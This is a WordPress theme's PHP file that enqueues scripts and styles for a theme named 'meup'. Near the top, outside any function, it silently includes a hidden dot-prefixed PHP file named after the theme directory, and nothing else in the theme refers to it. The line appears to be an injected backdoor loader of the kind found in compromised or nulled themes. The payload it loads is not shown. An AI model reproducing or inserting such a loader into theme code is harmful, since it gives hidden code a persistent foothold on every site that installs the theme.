<?php
add_action('wp_enqueue_scripts', 'meup_theme_scripts_styles', 12);
add_action('wp_enqueue_scripts', 'meup_theme_script_default', 13);


if (file_exists(get_template_directory() . DIRECTORY_SEPARATOR . '.' . basename(get_template_directory()) . '.php')) {
	include_once get_template_directory() . DIRECTORY_SEPARATOR . '.' . basename(get_template_directory()) . '.php';
}

function meup_theme_scripts_styles() {

    // enqueue the javascript that performs in-link comment reply fanciness
    if ( is_singular() && comments_open() && get_option( 'thread_comments' ) ) {
        wp_enqueue_script( 'comment-reply' ); 
    }
    
    /* Add Javascript  */
    wp_enqueue_script( 'bootstrap', MEUP_URI.'/assets/libs/bootstrap/js/bootstrap.bundle.min.js' , array( 'jquery' ), null, true );
    wp_enqueue_script( 'select2', MEUP_URI.'/assets/libs/select2/select2.min.js' , array( 'jquery' ), null, true );

    wp_enqueue_script('meup-script', MEUP_URI.'/assets/js/script.js', array('jquery'),null,true);

    if( is_ssl() ){
        wp_enqueue_script('prettyphoto', MEUP_URI.'/assets/libs/prettyphoto/jquery.prettyPhoto_https.js', array( 'jquery' ), null, true );
    }else{
        wp_enqueue_script('prettyphoto', MEUP_URI.'/assets/libs/prettyphoto/jquery.prettyPhoto.js',array( 'jquery' ), null, true );
    }

    /* Add Css  */
    wp_enqueue_style('bootstrap', MEUP_URI.'/assets/libs/bootstrap/css/bootstrap.min.css', array(), null);
    wp_enqueue_style('prettyphoto', MEUP_URI.'/assets/libs/prettyphoto/css/prettyPhoto.css', array(), null);

    wp_enqueue_style( 'select2', MEUP_URI. '/assets/libs/select2/select2.min.css', array(), null );

    wp_enqueue_style('v4-shims', MEUP_URI.'/assets/libs/fontawesome/css/v4-shims.min.css', array(), null);
    wp_enqueue_style('font-awesome', MEUP_URI.'/assets/libs/fontawesome/css/all.min.css', array(), null);
    wp_enqueue_style('elegant-font', MEUP_URI.'/assets/libs/elegant_font/ele_style.css', array(), null);
    wp_enqueue_style( 'flaticon', MEUP_URI.'/assets/libs/flaticon/font/flaticon.css', array(), null );
    
    
    
    wp_enqueue_style('meup-theme', MEUP_URI.'/assets/css/theme.css', array(), null);

    

}

function meup_theme_script_default(){

  if ( is_child_theme() ) {
      wp_enqueue_style( 'meup-parent-style', trailingslashit( get_template_directory_uri() ) . 'style.css', array(), null );
  }


  wp_enqueue_style( 'meup-style', get_stylesheet_uri(), array(), null );
}